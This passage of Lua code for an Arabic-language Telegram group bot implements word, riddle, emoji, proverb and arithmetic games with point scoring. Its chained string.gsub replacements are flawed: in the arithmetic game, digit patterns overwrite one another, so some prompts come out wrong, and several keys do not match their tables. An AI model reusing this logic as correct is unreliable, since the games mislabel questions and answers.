name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📓','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📂','🗂')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
ABS_PROX = '☬︙ٱوڵ وٱحد يدز هذٱ ٱڵسمٱيڵ {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(DevProx..'bot:klmos'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(DevProx..'bot:l:ids'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:ids'..msg.chat_id_) then 
ABS_PROX = '☬︙ڵقد ربحت وحصڵت عڵى نقطة \n☬︙ٱرسڵ ( سمايلات ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and Abbas_Abs(msg) or text == 'الترتيب' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(DevProx..'bot:klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
ABS_PROX = '☬︙ٱوڵ وٱحد يرتبهٱ {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(DevProx..'bot:klmo'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '☬︙ڵقد ربحت وحصڵت عڵى نقطة \n☬︙ٱرسڵ ( ترتيب ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end
if text == 'محيبس' and Abbas_Abs(msg) or text == 'بات' and Abbas_Abs(msg) or text == 'المحيبس' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
Num = math.random(1,6)
DevAbs:set(DevProx.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀       ➁       ➂       ➃       ➄       ➅
↓       ↓       ↓       ↓       ↓       ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿

☬︙ٱختر رقم لٱستخرٱج ٱڵمحيبس
☬︙ٱڵفٱئز يحصڵ عڵى (5) نقٱط
]]
Dev_Abs( msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevAbs:setex(DevProx.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end end
if text == 'حزوره' and Abbas_Abs(msg) or text == 'الحزوره' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(DevProx..'bot:bkbk'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
ABS_PROX = '☬︙ٱوڵ وٱحد يحڵهٱ {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '☬︙ڵقد ربحت وحصڵت عڵى نقطة \n☬︙ٱرسڵ ( حزوره ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المعاني' and Abbas_Abs(msg) or text == 'معاني' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(DevProx..'bot:bkbk2'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
ABS_PROX = '☬︙مٱ معنى هذٱ ٱڵسمٱيڵ :؟ {'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk2'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '☬︙ڵقد ربحت وحصڵت عڵى نقطة \n☬︙ٱرسڵ ( المعاني ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'العكس' and Abbas_Abs(msg) or text == 'عكس' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(DevProx..'bot:bkbk3'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
ABS_PROX = '☬︙مٱ هو عكس كڵمة {'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk3'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '☬︙ڵقد ربحت وحصڵت عڵى نقطة \n☬︙ٱرسڵ ( العكس ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المختلف' and Abbas_Abs(msg) or text == 'مختلف' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(DevProx..'bot:bkbk4'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
ABS_PROX = '☬︙ٱوڵ وٱحد يطڵع ٱڵمختلف يربح\n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk4'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '☬︙ڵقد ربحت وحصڵت عڵى نقطة \n☬︙ٱرسڵ ( المختلف ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'امثله' and Abbas_Abs(msg) or text == 'الامثله' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(DevProx..'bot:bkbk5'..msg.chat_id_,name)
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'جوز','[ينطي ___ للماعنده سنون]')
name = string.gsub(name,'ضراطه','[الي يسوق المطي يتحمل ___ ]')
name = string.gsub(name,'بيدك','[اكل ___ محد يفيدك]')
name = string.gsub(name,'الحافي','[تجدي من ___ نعال]')
name = string.gsub(name,'شقره','[مع الخيل يا ___ ]')
name = string.gsub(name,'النخله','[الطول طول ___ والعقل عقل الصخلة]')
name = string.gsub(name,'سلايه','[بالوجه امراية وبالظهر ___ ]')
name = string.gsub(name,'الخيل','[من قلة ___ شدو على الچلاب سروج]')
name = string.gsub(name,'حداد','[موكل من صخم وجهه كال آني ___ ]')
name = string.gsub(name,'المبلل','[ ___ ما يخاف من المطر]')
name = string.gsub(name,'الحبل','[اللي تلدغة الحية يخاف من جرة ___ ]')
name = string.gsub(name,'يركص','[المايعرف ___ يكول الكاع عوجه]')
name = string.gsub(name,'العنب','[المايلوح ___ يكول حامض]')
name = string.gsub(name,'العمه','[___ إذا حبت الچنة ابليس يدخل الجنة]')
name = string.gsub(name,'الخبز','[انطي ___ للخباز حتى لو ياكل نصه]')
name = string.gsub(name,'بالحصاد','[اسمة ___ ومنجله مكسور]')
name = string.gsub(name,'شهر','[امشي ___ ولا تعبر نهر]')
name = string.gsub(name,'شكه','[يامن تعب يامن ___ يا من على الحاضر لكة]')
name = string.gsub(name,'القرد','[ ___ بعين امه غزال]')
name = string.gsub(name,'يكحله','[اجه ___ عماها]')
ABS_PROX = '☬︙ٱكمڵ ٱڵمثٱڵ ٱڵتٱڵي {'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk5'..msg.chat_id_) or 'qssp')..'' then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(DevProx..'bot:bkbk5'..msg.chat_id_)
ABS_PROX = '☬︙ڵقد ربحت وحصڵت عڵى نقطة \n☬︙ٱرسڵ ( امثله ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'رياضيات' and Abbas_Abs(msg) or text == 'الرياضيات' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(DevProx..'bot:bkbk6'..msg.chat_id_,name)
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
ABS_PROX = '☬︙ٱكمڵ ٱڵمعٱدله ٱڵتٱڵيه \n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(DevProx..'bot:bkbk6'..msg.chat_id_) or 'qssp')..'' then
if not DevAbs:get(DevProx..'bot:l:id'..msg.chat_id_) then 
DevAbs:incrby(DevProx..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(DevProx..'bot:bkbk6'..msg.chat_id_)
ABS_PROX = '☬︙ڵقد ربحت وحصڵت عڵى نقطة \n☬︙ٱرسڵ ( رياضيات ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end
DevAbs:set(DevProx..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'الانكليزي' or text == 'الانجليزيه' or text == 'انكليزيه' and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(DevProx..'bot:bkbk7'..msg.chat_id_,name)
DevAbs:del(DevProx..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
